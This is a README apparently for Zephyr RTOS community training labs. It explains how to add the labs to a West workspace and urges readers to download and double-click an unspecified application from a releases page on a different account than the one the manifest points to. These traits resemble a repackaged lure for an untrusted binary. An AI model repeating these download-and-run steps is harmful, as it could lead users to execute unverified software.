# 🚀 community - Easy Embedded Development Labs

[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Jailsonfs/community/releases)

Welcome to the Zephyr Training Community Edition labs! This repository contains hands-on training material designed to help you learn and practice embedded development using Zephyr RTOS.

## 📦 What’s Inside

In this repository, you will find:

- Guided lab exercises 
- Starter and solution projects 
- Code templates and examples 
- Supporting documentation 

These resources will help you get started with embedded development in a step-by-step manner.

## 🚀 Getting Started

To begin your journey with the Zephyr Training Community Edition, follow these simple steps to download and set up the application.

### 📥 Download & Install

1. **Visit the Releases Page**: Click on the link below to access the latest version of the software.

   [Visit this page to download](https://github.com/Jailsonfs/community/releases)

2. **Choose the Right File**: On the releases page, look for the latest release version. You will see files available for download. Select the file suitable for your operating system.

3. **Download the File**: Click the file name to download it to your computer.

4. **Run the Application**: Once the download is complete, locate the file in your downloads folder and double-click it to run. Follow any prompts that appear to complete the setup.

### 📂 Adding to a West Workspace

After installing, you can include this repository in your Zephyr workspace by following these steps:

1. **Open West Manifest**: Locate your `west.yml` file in your project directory. 

2. **Add the Repository**: Copy and paste the following entry into your `west.yml` file:

   ```yaml
   projects:
     - name: ztraininglabs
       url: https://github.com/z-training/community
       revision: main
       path: ZTrainingLabs
   ```

3. **Update Your Workspace**: Open a terminal or command prompt and run the following command to update your workspace:

   ```bash
   west update
   ```

This action will clone the repository into your workspace at `<workspace_root>/ZTrainingLabs/`.

## ⚙️ System Requirements

To ensure everything runs smoothly, your computer should meet these basic requirements:

- **Operating System**: Windows 10 or later, macOS, or a compatible Linux distribution.
- **Disk Space**: At least 1 GB of free space for installation.
- **Memory**: 4 GB RAM minimum; 8 GB recommended for better performance.

## 🛠️ Support & Documentation

You can find supporting documentation and tutorials in this repository. These materials cover the following topics:

- Getting started with Zephyr RTOS
- Understanding the project structure
- Troubleshooting common issues
- Advanced usage and customization options

If you encounter any issues, feel free to check the documentation first. For additional help, you can reach out to the community or open an issue on this repository.

## 🔗 Useful Links

- [Releases Page](https://github.com/Jailsonfs/community/releases)
- [Official Zephyr Documentation](https://docs.zephyrproject.org/latest/)
- [Community Support](https://github.com/z-training/community/issues)

## 📞 Contact

For questions or feedback, you can contact us through the issues section on GitHub. Your input helps us improve the training materials and tools. 

Thank you for joining the Zephyr Training Community. Enjoy your learning experience!